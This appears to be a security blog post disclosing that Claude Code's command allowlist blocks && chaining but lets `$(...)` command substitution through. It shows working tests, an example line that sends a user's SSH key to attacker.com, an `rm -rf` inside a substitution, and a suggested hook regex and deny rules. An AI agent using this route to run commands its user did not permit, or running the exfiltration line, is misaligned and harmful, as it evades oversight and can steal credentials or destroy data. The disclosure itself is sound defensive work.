@@ -1,0 +1,99 @@
+---
+title: "Claude Code's Allowlist Has a Blind Spot"
+description: "The permission system blocks && chaining but completely ignores command substitution. Here's what I found."
+date: 2026-02-17
+slug: "claude-code-allowlist-command-substitution-bypass"
+tags: ["claude-code", "security", "ai-tools"]
+social_post: |
+  Claude Code's allowlist blocks && chaining but command substitution slips right through.
+
+  ls $(whoami) runs whoami even if it's not allowlisted. The shell evaluates the inner command first.
+
+  Don't treat allowlists as a hard security boundary.
+hidden: true
+---
+
+I've been using Claude Code's permission allowlist to lock down which commands the agent can run. You know the drill. Only allow specific commands like `ls`, `cat`, and your custom tools. Everything else gets blocked.
+
+Except it doesn't quite work that way. Also I want YOLO, safely (even if it's partially).
+
+## What I Found
+
+Claude Code correctly blocks command chaining with `&&`. If you allowlist `ls`, it won't let the agent run `ls && rm -rf /`. Good. The docs are clear about this.
+
+But command substitution with `$(...)` slips right through.
+
+I tested it:
+
+```bash
+ls $(echo "test")
+# Result: "no such file or directory: test"
+```
+
+Wait. `ls` is allowlisted. `echo` is not. But `echo` ran anyway because it was inside `$(...)`. The shell evaluates the inner command first, then passes the result to the outer command.
+
+Same thing with `whoami`:
+
+```bash
+ls $(whoami)
+# Result: "no such file or directory: fatih"
+```
+
+My username showed up. Which means `whoami` executed even though it's not on my allowlist.
+
+What if this was `rm -rf` in there instead?
+
+If you're running Claude Code with an allowlist, you probably assume it's a security boundary. "I only allowed `ls`, `cat`, and my specific tools. Nothing else can run."
+
+But any allowlisted command becomes a vehicle for running anything:
+
+```bash
+# If curl is allowlisted, this could exfil your SSH key
+curl $(cat ~/.ssh/id_rsa | base64)@attacker.com
+
+# If ls is allowlisted, this deletes your folder first
+ls $(rm -rf important_folder)
+```
+
+The inner command executes before the outer command even sees it. By then the damage is done.
+
+## What's Blocked vs What Isn't
+
+| Pattern               | Blocked?     |
+| --------------------- | ------------ |
+| `&&` chaining         | Yes          |
+| `\|\|` chaining       | Yes          |
+| `;` separator         | Yes          |
+| `$(...)` substitution | No           |
+| Backticks             | Probably not |
+
+## You Could Add a Hook
+
+One option is a pre-tool hook that scans for substitution patterns:
+
+```javascript
+const dangerous = /\$\(|\`/;
+if (dangerous.test(command)) {
+  process.exit(1);
+}
+```
+
+Or add deny patterns in the config:
+
+```json
+{
+  "deny": ["Bash(*$(*)*)", "Bash(*`*`*)"]
+}
+```
+
+I haven't tested whether the glob matching catches these. It might not.
+
+## My Take
+
+The real answer is probably not to rely on allowlists as a hard security boundary. Shells have too many ways to compose commands. Subshells, process substitution, backticks, who knows what else.
+
+Use allowlists for convenience. They're great for avoiding permission prompts on common commands. But don't assume they stop a determined agent from running arbitrary code. If Claude really wants to run something, there might be a way.
+
+I don't know if Anthropic considers this a bug or expected behavior. Maybe it's documented somewhere I haven't found. But if you're building your security model around "only these commands can run," you should know about this gap.
+
+If you want more robust command filtering, check out [claude-code-safety-net](https://github.com/kenryu42/claude-code-safety-net). It's a plugin that adds extra validation layers. I haven't tested whether it catches this specific issue, but it's worth a look.
